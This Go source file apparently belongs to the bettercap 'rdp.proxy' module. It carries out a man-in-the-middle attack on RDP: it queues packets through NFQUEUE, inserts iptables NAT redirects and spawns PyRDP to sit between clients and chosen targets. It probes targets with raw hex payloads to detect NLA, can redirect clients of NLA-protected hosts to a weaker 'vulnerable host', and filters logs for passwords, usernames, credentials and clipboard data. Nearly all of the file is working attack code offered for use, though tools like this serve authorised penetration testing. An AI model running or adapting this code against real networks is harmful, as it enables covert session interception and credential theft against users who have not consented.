package rdp_proxy

import (
    "bufio"
    "bytes"
    "encoding/hex"
    "errors"
    "fmt"
    "os/exec"
    "io"
    "io/ioutil"
    golog "log"
    "net"
    "os"
    "regexp"
    "time"
    "syscall"

    "github.com/bettercap/bettercap/core"
    "github.com/bettercap/bettercap/network"
    "github.com/bettercap/bettercap/session"

    "github.com/chifflier/nfqueue-go/nfqueue"
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
)

type RdpProxy struct {
    session.SessionModule
    targets      []net.IP
    done         chan bool
    queue        *nfqueue.Queue
    queueNum     int
    port         int
    startPort    int
    cmd          string
    outpath      string
    nlaMode      string
    playerIP     net.IP
    playerPort   int
    redirectIP   net.IP
    redirectPort int
    replay       bool
    regexp       string
    compiled     *regexp.Regexp
    active       map[string]exec.Cmd
}

var mod *RdpProxy

func NewRdpProxy(s *session.Session) *RdpProxy {
    mod = &RdpProxy{
        SessionModule: session.NewSessionModule("rdp.proxy", s),
        targets:       make([]net.IP, 0),
        done:          make(chan bool),
        queue:         nil,
        queueNum:      0,
        port:          3389,
        startPort:     40000,
        cmd:           "pyrdp-mitm.py",
        outpath:       "./pyrdp_output",
        nlaMode:       "IGNORE",
        playerIP:      make(net.IP, 0),
        playerPort:    3000,
        redirectIP:    make(net.IP, 0),
        redirectPort:  3389,
        replay:        false,
        regexp:        "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password|error)",
        active:        make(map[string]exec.Cmd),
    }

    mod.AddHandler(session.NewModuleHandler("rdp.proxy on", "", "Start the RDP proxy.",
        func(args []string) error {
            return mod.Start()
        }))

    mod.AddHandler(session.NewModuleHandler("rdp.proxy off", "", "Stop the RDP proxy.",
        func(args []string) error {
            return mod.Stop()
        }))

    // Required parameters
    mod.AddParam(session.NewIntParameter("rdp.proxy.queue.num", "0", "NFQUEUE number to bind to."))
    mod.AddParam(session.NewIntParameter("rdp.proxy.port", "3389", "RDP port to intercept."))
    mod.AddParam(session.NewIntParameter("rdp.proxy.start", "40000", "Starting port for PyRDP sessions."))
    mod.AddParam(session.NewBoolParameter("rdp.proxy.replay", "false", "Specify if PyRDP shoudld save replay recording."))
    mod.AddParam(session.NewStringParameter("rdp.proxy.command", "pyrdp-mitm.py", "", "The PyRDP base command to launch the man-in-the-middle."))
    mod.AddParam(session.NewStringParameter("rdp.proxy.out", "./pyrdp_output", "", "The output directory for PyRDP artifacts."))
    mod.AddParam(session.NewStringParameter("rdp.proxy.targets", session.ParamSubnet, "", "Comma separated list of IP addresses to proxy to, also supports nmap style IP ranges."))
    mod.AddParam(session.NewStringParameter("rdp.proxy.regexp", "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password|error)", "", "Print PyRDP logs matching this regular expression."))
    // Optional paramaters
    mod.AddParam(session.NewStringParameter("rdp.proxy.nla.mode", "IGNORE", "(IGNORE|REDIRECT)", "Specify how to handle connections to a NLA-enabled host. Either IGNORE or REDIRECT."))
    mod.AddParam(session.NewStringParameter("rdp.proxy.nla.redirect.ip", "", "", "Specify IP to redirect clients that connects to NLA targets. Require rdp.proxy.nla.mode REDIRECT."))
    mod.AddParam(session.NewIntParameter("rdp.proxy.nla.redirect.port", "3389", "Specify port to redirect clients that connects to NLA targets. Require rdp.proxy.nla.mode REDIRECT."))
    mod.AddParam(session.NewStringParameter("rdp.proxy.player.ip", "", "", "Destination IP address of the PyRDP player."))
    mod.AddParam(session.NewIntParameter("rdp.proxy.player.port", "3000", "Listening port of the PyRDP player."))

    return mod
}

func (mod RdpProxy) Name() string {
    return "rdp.proxy"
}

func (mod RdpProxy) Description() string {
    return "A Linux-only module that relies on NFQUEUEs and PyRDP in order to man-in-the-middle RDP sessions."
}

func (mod RdpProxy) Author() string {
    return "Alexandre Beaulieu <alex@segfault.me> && Maxime Carbonneau <pourliver@gmail.com>"
}

func (mod *RdpProxy) fileExists(name string) (bool, error) {
    _, err := os.Stat(name)
    if os.IsNotExist(err) {
      return false, nil
    }
    return err != nil, err
}

func (mod *RdpProxy) isTarget(ip string) bool {
    for _, addr := range mod.targets {
        if addr.String() == ip {
            return true
        }
    }
    return false
}

// Verify if the target says anything about enforcing NLA.
func (mod *RdpProxy) verifyNLA(target string, payload []byte) (isNla bool, err error) {
    var conn net.Conn

    if conn, err = net.Dial("tcp", target); err != nil {
        return true, err
    } else if err = conn.SetDeadline(time.Now().Add(2 * time.Second)); err != nil {
        return true, err
    }

    defer conn.Close()

    conn.Write([]byte(payload))

    if _, err = conn.Write([]byte(payload)); err != nil {
        return true, err
    }

    buffer := make([]byte, 1024)

    if n, err := conn.Read(buffer[:]); n != 19 || err != nil {
        return true, err
    }

    // If failure code is HYBRID_REQUIRED_BY_SERVER
    if buffer[11] == 3 && buffer[15] == 5 {
        return true, err
    }

    return false, err
}

func (mod *RdpProxy) isNLAEnforced(target string) (nla bool, err error){
    // TCP payloads to validate if RDP and TLS are supported.
    // Will return a special value if NLA is enforced
    rdpPayload, _ := hex.DecodeString("030000130ee000000000000100080000000000")
    tlsPayload, _ := hex.DecodeString("030000130ee000000000000100080001000000")

    var nlaCheck1 bool
    var nlaCheck2 bool

    if nlaCheck1, err = mod.verifyNLA(target, rdpPayload); err != nil {
        NewRdpProxyEvent("127.0.0.1", target, "Target unreachable or timeout during NLA validation. Will handle target as NLA.").Push()
        return true, err
    } else if  nlaCheck2, err = mod.verifyNLA(target, tlsPayload); err != nil {
        NewRdpProxyEvent("127.0.0.1", target, "Target unreachable or timeout during NLA validation. Will handle target as NLA.").Push()
        return true, err
    }

    // If NLA is enforced
    if nlaCheck1 && nlaCheck2 {
        return true, nil
    }

    return false, nil
}

func (mod *RdpProxy) startProxyInstance(client string, target string) (err error) {
    // Create a proxy agent and firewall rules.
    args := []string{
        "-l", fmt.Sprintf("%d", mod.startPort),
        "-o", mod.outpath,
    }

    if !mod.replay {
        args = append(args, "--no-replay")
    }

    // PyRDP Player options
    if mod.playerIP != nil {
        args = append(args, "-i")
        args = append(args, mod.playerIP.String())

        args = append(args, "-d")
        args = append(args, fmt.Sprintf("%d", mod.playerPort))
    }

    args = append(args, target)

    // Spawn PyRDP proxy instance
    cmd := exec.Command(mod.cmd, args...)
    stderrPipe, _ := cmd.StderrPipe()

    if err := cmd.Start(); err != nil {
        // Wont't handle things like "port already in use" since it happens at runtime
        mod.Error("PyRDP Start error : %v", err.Error())

        NewRdpProxyEvent(client, target, "Failed to start PyRDP, won't intercept target.").Push()

        return err
    }

    // Use goroutines to keep logging each instance of PyRDP
    go mod.filterLogs(client, target, stderrPipe)

    mod.active[target] = *cmd
    return
}

// Filter PyRDP logs to only show those that matches mod.regexp
func (mod *RdpProxy) filterLogs(src string, dst string, output io.ReadCloser) {
    scanner := bufio.NewScanner(output)

    // For every log in the queue
    for scanner.Scan() {
        text := scanner.Bytes()
        if mod.compiled == nil || mod.compiled.Match(text) {
            // Extract the meaningful part of the log
            chunks := bytes.Split(text, []byte(" - "))

            // Get last element
            data := chunks[len(chunks) - 1]

            NewRdpProxyEvent(src, dst, fmt.Sprintf("%s", data)).Push()
        }
    }
}

// Adds the firewall rule for proxy instance.
func (mod *RdpProxy) doProxy(dst string, proxyPort string) (err error) {
    _, err = core.Exec("iptables", []string{
        "-t", "nat",
        "-I", "BCAPRDP", "1",
        "-d", dst,
        "-p", "tcp",
        "--dport", fmt.Sprintf("%d", mod.port),
        "-j", "REDIRECT",
        "--to-ports", proxyPort,
    })
    return
}

func (mod *RdpProxy) doReturn(dst string, dport string) (err error) {
    _, err = core.Exec("iptables", []string{
        "-t", "nat",
        "-I", "BCAPRDP", "1",
        "-p", "tcp",
        "-d", dst,
        "--dport", dport,
        "-j", "RETURN",
    })
    return
}

func (mod *RdpProxy) configureFirewall(enable bool) (err error) {
    rules := [][]string{}

    if enable {
        rules = [][]string{
            { "-t", "nat", "-N", "BCAPRDP" },
            { "-t", "nat", "-I", "PREROUTING", "1", "-j", "BCAPRDP" },
            { "-t", "nat", "-A", "BCAPRDP",
                "-p", "tcp", "-m", "tcp", "--dport", fmt.Sprintf("%d", mod.port),
                "-j", "NFQUEUE", "--queue-num", fmt.Sprintf("%d", mod.queueNum), "--queue-bypass",
            },
            // This rule tries to fix an optimization bug in recent versions of iptables
            // The bug : if no rules in the nat table tries to modify the current packet, skip the nat table
            // The NFQueue doesn't count as a modification.
            { "-t", "nat", "-A", "BCAPRDP",
                "-p", "tcp", "-m", "tcp", "-d", "127.0.0.1", "--dport", "3388",
                "-j", "REDIRECT", "--to-ports", "62884",
            },
        }

    } else if !enable {
        rules = [][]string{
            { "-t", "nat", "-D", "PREROUTING", "-j", "BCAPRDP" },
            { "-t", "nat", "-F", "BCAPRDP" },
            { "-t", "nat", "-X", "BCAPRDP" },
        }
    }

    for _, rule := range rules {
        if _, err = core.Exec("iptables", rule); err != nil {
            return err
        }
    }
    return
}

// Fixes a bug that may come up when interrupting the application too quickly.
func (mod *RdpProxy) repairFirewall() (err error) {
    rules := [][]string{
        { "-t", "nat", "-D", "PREROUTING", "-j", "BCAPRDP" },
        { "-t", "nat", "-F", "BCAPRDP" },
        { "-t", "nat", "-X", "BCAPRDP" },
    }

    // Force a cleaning of previous rules
    for _, rule := range rules {
        core.Exec("iptables", rule);
    }
    return
}

func (mod *RdpProxy) Configure() (err error) {
    var targets string

    golog.SetOutput(ioutil.Discard)
    mod.destroyQueue()

    if err, mod.port = mod.IntParam("rdp.proxy.port"); err != nil {
        return
    } else if mod.port < 1 || mod.port > 65535 {
        return errors.New("rdp.proxy.port must be between 1 and 65535")
    } else if err, mod.cmd = mod.StringParam("rdp.proxy.command"); err != nil {
        return
    } else if err, mod.outpath = mod.StringParam("rdp.proxy.out"); err != nil {
        return
    } else if err, mod.queueNum = mod.IntParam("rdp.proxy.queue.num"); err != nil {
        return
    } else if mod.queueNum < 0 || mod.queueNum > 65535 {
        return errors.New("rdp.proxy.queue.num must be between 0 and 65535")
    } else if err, targets = mod.StringParam("rdp.proxy.targets"); err != nil {
        return
    } else if mod.targets, _, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
        return
    } else if err, mod.regexp = mod.StringParam("rdp.proxy.regexp"); err != nil {
        return
    } else if err, mod.replay = mod.BoolParam("rdp.proxy.replay"); err != nil {
        return
    } else if err, mod.nlaMode = mod.StringParam("rdp.proxy.nla.mode"); err != nil {
        return
    } else if err, mod.redirectIP = mod.IPParam("rdp.proxy.nla.redirect.ip"); err != nil {
        return
    } else if err, mod.redirectPort = mod.IntParam("rdp.proxy.nla.redirect.port"); err != nil {
        return
    } else if mod.redirectPort < 1 || mod.redirectPort > 65535 {
        return errors.New("rdp.proxy.nla.redirect.port must be between 1 and 65535")
    } else if err, mod.playerIP = mod.IPParam("rdp.proxy.player.ip"); err != nil {
        return
    } else if err, mod.playerPort = mod.IntParam("rdp.proxy.player.port"); err != nil {
        return
    } else if mod.playerPort < 1 || mod.playerPort > 65535 {
        return errors.New("rdp.proxy.player.port must be between 1 and 65535")
    } else if _, err = exec.LookPath(mod.cmd); err != nil {
        return
    } else if _, err = mod.fileExists(mod.cmd); err != nil {
        return
    }

    if mod.nlaMode == "REDIRECT" && mod.redirectIP == nil {
        return errors.New("rdp.proxy.nla.redirect.ip must be set when using mode REDIRECT")
    }

    if mod.regexp != "" {
        if mod.compiled, err = regexp.Compile(mod.regexp); err != nil {
            return
        }
    }

    mod.Info("Starting RDP Proxy")
    mod.Debug("Targets=%v", mod.targets)

    // Create the NFQUEUE handler.
    mod.queue = new(nfqueue.Queue)
    if err = mod.queue.SetCallback(OnRDPConnection); err != nil {
        return
    } else if err = mod.queue.Init(); err != nil {
        return
    } else if err = mod.queue.Unbind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.Bind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.CreateQueue(mod.queueNum); err != nil {
        return
    } else if err = mod.queue.SetMode(nfqueue.NFQNL_COPY_PACKET); err != nil {
        return
    } else if err = mod.configureFirewall(true); err != nil {
        // Attempt to repair firewall, then retry once
        mod.repairFirewall()
        if err = mod.configureFirewall(true); err != nil {
            return
        }
    }
    return nil
}

func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
    // Determine source and target addresses.
    p := gopacket.NewPacket(payload.Data, layers.LayerTypeIPv4, gopacket.Default)
    src, sport := p.NetworkLayer().NetworkFlow().Src().String(), fmt.Sprintf("%s", p.TransportLayer().TransportFlow().Src())
    dst, dport := p.NetworkLayer().NetworkFlow().Dst().String(), fmt.Sprintf("%s", p.TransportLayer().TransportFlow().Dst())

    client := fmt.Sprintf("%s:%s", src, sport)
    target := fmt.Sprintf("%s:%s", dst, dport)

    if mod.isTarget(dst) {

        // Check if the destination IP already has a PyRDP session active, if so, do nothing.
        if _, ok :=  mod.active[target]; !ok {
            targetNLA, _ := mod.isNLAEnforced(target)

            if targetNLA {
                if mod.nlaMode == "REDIRECT" {
                    // Start a PyRDP instance to the preconfigured vulnerable host
                    // and forward packets to the target to this host instead
                    NewRdpProxyEvent(client, target, "Target has NLA enabled and mode REDIRECT, forwarding to the vulnerable host.").Push()

                    redirectTarget := fmt.Sprintf("%s:%d", mod.redirectIP.String(), mod.redirectPort)
                    err := mod.startProxyInstance(client, redirectTarget)

                    if err != nil {
                        // Add an exception in the firewall to avoid intercepting packets to this destination and port
                        mod.doReturn(dst, dport)
                        payload.SetVerdict(nfqueue.NF_DROP)

                        return 0
                    }

                    mod.doProxy(dst, fmt.Sprintf("%d", mod.startPort))
                    mod.startPort += 1
                } else {
                    // Add an exception in the firewall to avoid intercepting packets to this destination and port
                    NewRdpProxyEvent(client, target, "Target has NLA enabled and mode IGNORE, won't intercept.").Push()

                    mod.doReturn(dst, dport)
                }
            } else {
                // Starts a PyRDP instance.
                NewRdpProxyEvent(client, target, "Target doesn't have NLA enabled, intercepting.").Push()
                if err := mod.startProxyInstance(client, target); err != nil {
                    // Add an exception in the firewall to avoid intercepting packets to this destination and port
                    mod.doReturn(dst, dport)
                    payload.SetVerdict(nfqueue.NF_DROP)

                    return 0
                }

                // Add a NAT rule in the firewall for this particular target IP
                mod.doProxy(dst, fmt.Sprintf("%d", mod.startPort))
                mod.startPort += 1
            }
        }
    } else {
        NewRdpProxyEvent(client, target, "Non-target, won't intercept.").Push()

        // Add an exception in the firewall to avoid intercepting packets to this destination and port
        mod.doReturn(dst, dport)
    }

    // Force a retransmit to trigger the new firewall rules. (TODO: Find a more efficient way to do this.)
    payload.SetVerdict(nfqueue.NF_DROP)

    return 0
}

// NFQUEUE needs a raw function.
func OnRDPConnection(payload *nfqueue.Payload) int {
    return mod.handleRdpConnection(payload)
}

func (mod *RdpProxy) Start() error {
    if mod.Running() {
        return session.ErrAlreadyStarted(mod.Name())
    } else if err := mod.Configure(); err != nil {
        mod.Fatal("%s", err.Error())
        return err
    }

    return mod.SetRunning(true, func() {
        mod.Info("started on queue number %d", mod.queueNum)

        defer mod.destroyQueue()

        mod.queue.Loop()

        mod.done <- true
    })
}

func (mod *RdpProxy) Stop() error {
    return mod.SetRunning(false, func() {
        mod.queue.StopLoop()
        mod.configureFirewall(false)
        for _, cmd := range mod.active {
            cmd.Process.Kill() // FIXME: More graceful way to shutdown proxy agents?
        }

        <-mod.done
    })
}

func (mod *RdpProxy) destroyQueue() {
    if mod.queue == nil {
        return
    }

    mod.queue.DestroyQueue()
    mod.queue.Close()
    mod.queue = nil
}